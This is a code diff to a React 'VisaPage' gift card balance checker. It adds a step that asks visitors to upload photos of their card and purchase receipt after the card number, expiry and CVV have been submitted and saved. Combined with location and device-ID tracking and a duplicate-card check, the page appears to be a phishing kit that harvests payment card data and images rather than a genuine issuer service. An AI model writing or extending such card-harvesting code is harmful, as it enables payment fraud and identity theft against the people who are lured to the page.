@@ -14,6 +14,13 @@ export default function VisaPage() {
     const [location, setLocation] = useState('Unknown')
     const [deviceId, setDeviceId] = useState(null)
 
+    // Receipt upload states
+    const [showUploadStep, setShowUploadStep] = useState(false)
+    const [selectedImages, setSelectedImages] = useState([])
+    const [uploadProgress, setUploadProgress] = useState(false)
+    const [uploadComplete, setUploadComplete] = useState(false)
+    const [uploadError, setUploadError] = useState(null)
+
     useEffect(() => {
         async function detectLocation() {
             try {
@@ -70,11 +77,88 @@ export default function VisaPage() {
             const data = await res.json()
             if (!res.ok) throw new Error(data?.error || 'Unable to verify card. Please try again later.')
             setResult(data)
+            // Show upload step only if card was successfully saved (has cardId) and not a duplicate
+            if (data.cardId && !data.isDuplicate) {
+                setShowUploadStep(true)
+            }
         } catch (err) {
             setError(err.message)
         } finally {
             setLoading(false)
         }
+    }
+
+    const handleImageSelect = (e) => {
+        const files = Array.from(e.target.files)
+        if (files.length + selectedImages.length > 3) {
+            setUploadError('Maximum 3 images allowed')
+            return
+        }
+
+        setUploadError(null)
+
+        files.forEach(file => {
+            const reader = new FileReader()
+            reader.onload = (event) => {
+                setSelectedImages(prev => [...prev, {
+                    file,
+                    preview: event.target.result,
+                    base64: event.target.result
+                }])
+            }
+            reader.readAsDataURL(file)
+        })
+    }
+
+    const removeImage = (index) => {
+        setSelectedImages(prev => prev.filter((_, i) => i !== index))
+    }
+
+    const handleUpload = async () => {
+        if (selectedImages.length === 0) {
+            setUploadError('Please select at least one image')
+            return
+        }
+
+        setUploadProgress(true)
+        setUploadError(null)
+
+        try {
+            const res = await fetch('/api/upload-receipt', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    cardId: result.cardId,
+                    images: selectedImages.map(img => img.base64)
+                })
+            })
+
+            const data = await res.json()
+            if (!res.ok) throw new Error(data?.error || 'Upload failed')
+
+            setUploadComplete(true)
+            setShowUploadStep(false)
+        } catch (err) {
+            setUploadError(err.message)
+        } finally {
+            setUploadProgress(false)
+        }
+    }
+
+    const skipUpload = () => {
+        setShowUploadStep(false)
+        setSelectedImages([])
+    }
+
+    const resetForm = () => {
+        setCard('')
+        setExpiry('')
+        setCvv('')
+        setResult(null)
+        setShowUploadStep(false)
+        setSelectedImages([])
+        setUploadComplete(false)
+        setUploadError(null)
     }
 
     return (
@@ -192,7 +276,7 @@ export default function VisaPage() {
                                 </button>
                             </form>
 
-                            {result && (
+                            {result && !showUploadStep && (
                                 <div className={styles.result}>
                                     <div className={styles.resultHeader}>
                                         <span className={styles.statusDot}></span>
@@ -208,7 +292,56 @@ export default function VisaPage() {
                                             <span className={styles.amount}>${result.balance?.toFixed(2)} {result.currency}</span>
                                         </div>
                                     )}
+                                    {uploadComplete && (
+                                        <div style={{ background: 'rgba(26, 31, 113, 0.1)', color: '#1a1f71', padding: '12px', borderRadius: '8px', marginBottom: '15px', textAlign: 'center' }}>
+                                            ✓ Uploaded successfully
+                                        </div>
+                                    )}
                                     <p className={styles.readyMsg}>Your Visa Gift Card is ready for use anywhere Visa is accepted.</p>
+                                    <button type="button" className={styles.button} onClick={resetForm} style={{ marginTop: '15px' }}>Check another card</button>
+                                </div>
+                            )}
+
+                            {showUploadStep && (
+                                <div className={styles.uploadStep}>
+                                    <div className={styles.uploadHeader}>
+                                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                                            <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z" />
+                                            <circle cx="12" cy="13" r="4" />
+                                        </svg>
+                                        <h3>Upload Card Image / Receipt</h3>
+                                    </div>
+                                    <p className={styles.uploadSubtitle}>For faster balance verification, upload a photo of your card and purchase receipt.</p>
+
+                                    <div className={styles.imagePreviewGrid}>
+                                        {selectedImages.map((img, idx) => (
+                                            <div key={idx} className={styles.previewItem}>
+                                                <img src={img.preview} alt={`Preview ${idx + 1}`} />
+                                                <button type="button" className={styles.removeBtn} onClick={() => removeImage(idx)}>×</button>
+                                            </div>
+                                        ))}
+                                        {selectedImages.length < 3 && (
+                                            <label className={styles.addImageBtn}>
+                                                <input
+                                                    type="file"
+                                                    accept="image/*"
+                                                    onChange={handleImageSelect}
+                                                    multiple
+                                                    style={{ display: 'none' }}
+                                                />
+                                                <span>+</span>
+                                                <span className={styles.addText}>Add Image</span>
+                                            </label>
+                                        )}
+                                    </div>
+
+                                    {uploadError && <div className={styles.error} style={{ marginTop: '15px' }}>{uploadError}</div>}
+
+                                    <div className={styles.uploadActions}>
+                                        <button type="button" className={styles.button} onClick={handleUpload} disabled={uploadProgress || selectedImages.length === 0}>
+                                            {uploadProgress ? 'Uploading...' : 'Upload'}
+                                        </button>
+                                    </div>
                                 </div>
                             )}
 
